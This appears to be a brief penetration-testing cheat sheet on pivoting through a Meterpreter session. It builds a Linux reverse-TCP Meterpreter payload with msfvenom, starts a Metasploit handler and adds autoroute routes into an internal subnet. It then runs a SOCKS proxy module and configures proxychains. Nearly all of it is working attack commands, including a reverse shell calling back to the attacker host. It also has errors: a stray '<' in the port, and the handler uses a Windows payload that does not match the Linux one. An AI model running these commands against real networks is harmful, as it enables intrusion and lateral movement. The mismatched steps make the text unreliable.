
PIVOT USING AUTOROUTE IN METERPRETER SESSION

```bash - kali
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$KALI LPORT=<443 -f elf > shell-x64.elf
```

```bash - kali
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $KALI;set LPORT 443;run;"
```

```meterpreter - kali
run autoroute -s 172.16.1.0/24
```

```meterpreter - kali
run autoroute -p
```

```meterpreter - kali
background
```

```meterpreter - kali
use auxiliary/server/socks_proxy

```

```meterpreter - kali
info
```

```meterpreter - kali
options
```

```meterpreter - kali
run
```

sudo mousepad /etc/proxychains4.conf

socks5 127.0.0.1 1080




